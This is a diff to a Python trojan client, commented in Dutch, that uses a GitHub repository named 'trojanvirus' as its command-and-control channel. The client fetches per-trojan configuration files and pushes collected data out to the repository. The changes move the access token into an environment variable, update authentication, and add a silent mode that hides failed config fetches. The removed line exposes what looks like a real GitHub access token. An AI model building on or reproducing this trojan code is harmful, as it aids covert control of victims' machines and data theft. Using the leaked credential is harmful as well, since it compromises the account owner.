@@ -14,11 +14,11 @@ import time
 import os
 import subprocess
 from datetime import datetime
-from github import Github
+from github import Github, Auth
 
 
 # Configuratie
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN") # Haal token uit environment variable voor veiligheid
 GITHUB_REPO = "Darkknin12/trojanvirus"
 TROJAN_ID = f"trojan_{random.randint(1000, 9999)}"  # Unieke ID per client
 
@@ -63,18 +63,20 @@ class GitHubConnector:
     """Klasse voor communicatie met GitHub repository"""
     
     def __init__(self, token, repo_naam):
-        self.github = Github(token)
+        auth = Auth.Token(token)
+        self.github = Github(auth=auth)
         self.repo = self.github.get_repo(repo_naam)
         self.branch = "main"
     
-    def haal_bestand_op(self, pad):
+    def haal_bestand_op(self, pad, stil=False):
         """Haal bestandsinhoud op van GitHub"""
         try:
             bestand = self.repo.get_contents(pad, ref=self.branch)
             # Decodeer van base64
             return base64.b64decode(bestand.content).decode('utf-8')
         except Exception as e:
-            print(f"[!] Fout bij ophalen {pad}: {e}")
+            if not stil:
+                print(f"[!] Fout bij ophalen {pad}: {e}")
             return None
     
     def stuur_data(self, pad, data, bericht="Data update"):
@@ -108,7 +110,8 @@ class GitHubConnector:
     def haal_config_op(self, trojan_id):
         """Haal configuratie op voor specifieke trojan"""
         config_pad = f"config/{trojan_id}.json"
-        inhoud = self.haal_bestand_op(config_pad)
+        # Probeer eerst specifieke config, wees stil als deze niet bestaat (404)
+        inhoud = self.haal_bestand_op(config_pad, stil=True)
         
         if inhoud:
             return json.loads(inhoud)
